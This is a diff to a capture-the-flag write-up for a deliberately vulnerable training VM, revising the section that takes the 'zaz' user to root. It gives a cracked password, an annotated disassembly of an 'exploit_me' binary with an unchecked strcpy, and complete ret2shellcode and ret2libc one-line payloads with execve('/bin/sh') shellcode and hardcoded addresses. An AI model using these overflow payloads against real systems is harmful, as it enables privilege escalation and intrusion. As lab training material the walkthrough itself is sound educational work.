@@ -723,7 +723,7 @@ Perfect, now we can assemble the password for the `thor` user. According to the 
 
 Using the hints from the `README` to eliminate some of the possibilities (since we have multiple answers for some stages) and brute forcing the rest, we can find the password:
 ```
-Publicspeakingisveryeasy.126241207201b2149opekmq426135`  
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 # User thor
@@ -777,18 +777,151 @@ The word `digest` is a hint, we need to hash the password. After using multiple 
 ```
 
 # User zaz
-log into zaz and exploit me function
-looking at the sub its 144 bytes, and we know that our buffer is 128. (lea start at 16, so 144 - 16 = 128)
-and strcpy doesn't check shit. anyways we write 140 characters and the next 4 ones will be return address
 
-ret2libc cause I couldnt do buffer overflow with shellcode
-https://bufferoverflows.net/ret2libc-exploitation-example/
+Let's login into the `zaz` user with the password we just found.
+```
+thor@BornToSecHackMe:~$ su zaz
+Password:
+zaz@BornToSecHackMe:~$
+```
 
-140 + system + exit + /bin/sh
+Let's see what's in the home directory.
+```
+zaz@BornToSecHackMe:~$ ls
+exploit_me  mail
+```
+
+No `README` this time and the `mail` folder doesn't have anything interesting. So our only option is to exploit the `exploit_me` executable, Let's try to run it:
+```
+zaz@BornToSecHackMe:~$ ./exploit_me
+zaz@BornToSecHackMe:~$ ./exploit_me hello
+hello
+```
+
+Alright let's use `gdb` and analyse the assembly code:
+```
+Dump of assembler code for function main:
+   # Usual setup
+   0x080483f4 <+0>:     push   %ebp
+   0x080483f5 <+1>:     mov    %esp,%ebp
+   0x080483f7 <+3>:     and    $0xfffffff0,%esp
+
+   # Allocating 144 bytes on the stack
+   0x080483fa <+6>:     sub    $0x90,%esp
+
+   # Compare 1 with argc
+   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
+   # If greater/not less or equal then jump to main+25
+   # To recap: if (argc <= 1)
+   0x08048404 <+16>:    jg     0x804840d <main+25>
+
+   # Moving 1 into eax to do a return 1
+   0x08048406 <+18>:    mov    $0x1,%eax
+   # Jump to main+66
+   0x0804840b <+23>:    jmp    0x8048436 <main+66>
+
+   # Moving *argv[0] into eax
+   0x0804840d <+25>:    mov    0xc(%ebp),%eax
+   # Go to *argv[1] (*argv[0] + 4 bytes = *argv[1])
+   0x08048410 <+28>:    add    $0x4,%eax
+   # Dereference the address to get the value (*argv[1] => argv[1])
+   0x08048413 <+31>:    mov    (%eax),%eax
+   # Moving argv[1] into esp to be used as the second argument of strcpy
+   0x08048415 <+33>:    mov    %eax,0x4(%esp)
+   # Calculate the address of esp + 16, this will be our buffer for strcpy, since we allocated 144 bytes for the stack our buffer will therefore be 128 bytes such as char buffer[128], and putting it into eax
+   0x08048419 <+37>:    lea    0x10(%esp),%eax
+   # Moving buffer into esp to be used as the first argument of strcpy
+   0x0804841d <+41>:    mov    %eax,(%esp)
+   # To recap: strcpy(buffer, argv[1])
+   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
+   # Calculate the address of buffer
+   0x08048425 <+49>:    lea    0x10(%esp),%eax
+   # Moving buffer into esp to be used as the argument of puts
+   0x08048429 <+53>:    mov    %eax,(%esp)
+   # To recap: puts(buffer)
+   0x0804842c <+56>:    call   0x8048310 <puts@plt>
+
+   # Moving 0 into eax to do a return 0
+   0x08048431 <+61>:    mov    $0x0,%eax
+   # Leaving the function
+   0x08048436 <+66>:    leave
+   0x08048437 <+67>:    ret
+End of assembler dump.
+```
+
+Here is a C equivalent of the assembly code:
+
+*The following C code is an excact translation of the assembly code, please compile it with `-fno-stack-protector` using `gcc` to get the same assembly result.*
+
+```c
+int main(int argc, char **argv)
+{
+    char buffer[128];
+
+    if (argc <= 1)
+        return 1;
+
+    strcpy(buffer, argv[1]);
+    puts(buffer);
+    return 0;
+}
+```
+
+Pretty basic, let's first check the security of the executable.
+```
+➜  ~ checksec --file=exploit_me
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    [...]
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH [...]
+```
+
+With this knowledge in mind and the fact that the original `C` file was compiled with the `-fno-stack-protector` flag, We can exploit the executable with a simple buffer overflow. In my case I'll do it with a ret2libc and a ret2shellcode.
+
+## Ret2shellcode
+
+To make a ret2shellcode, we will use the following logic:
+```
+shellcode + padding + address of shellcode
+```
+
+First of all, we need a shellcode. Here's ours:
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+
+// I will not go into details about the shellcode, there are plenty of resources online to learn about it
+```
+
+Then we need the size of the padding. We know that the stack was allocated 144 bytes, here's the stack layout:
+```
+ebp+16-144 ->  buffer
+ebp+8-12   ->  argv
+ebp+4-8    ->  argc
+ebp+0-4    ->  return address
+```
+
+Since we want to overwrite the return address, we need to write 140 bytes of padding. We need to reduce the size of the shellcode from the padding size, so 140 - 23 = 117 bytes of padding.
+
+Finally we need to find the address of the shellcode which we can do with `gdb`. That gives us the address `0xbffff8a8`.
+
+Here's the final command:
+```
+./exploit_me `python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "."*(140 - 23) + "\xbf\xff\xf8\xa8"[::-1])'`
+```
+
+## Ret2libc
+```
+./exploit_me `python -c 'print("."*140 + "\xb7\xe6\xb0\x60"[::-1] + "BEAN" + "\xb7\xf8\xcc\x58"[::-1])'`
+```
+
+```
+padding + address of system + any address + address of "/bin/sh"
+
+// Although I wrote any address, if you want the program to exit properly, you need to put the address of exit. I didn't bother with it since it works anyway.
+```
+
+```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-(gdb) p exit
-$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+```s
 
 how to find /bin/sh
 https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
@@ -813,13 +946,12 @@ Mapped address spaces:
         0xbffdf000 0xc0000000    0x21000        0x0 [stack]
 (gdb) find 0xb7e2b000,0xc0000000,"/bin/sh"
 0xb7f8cc58
-warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
-(gdb)
-
-./exploit_me `python -c 'print("."*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+```
 
 # We are root
+
+After executing on of the two exploits, we are now root!
 ```
 # whoami
 root
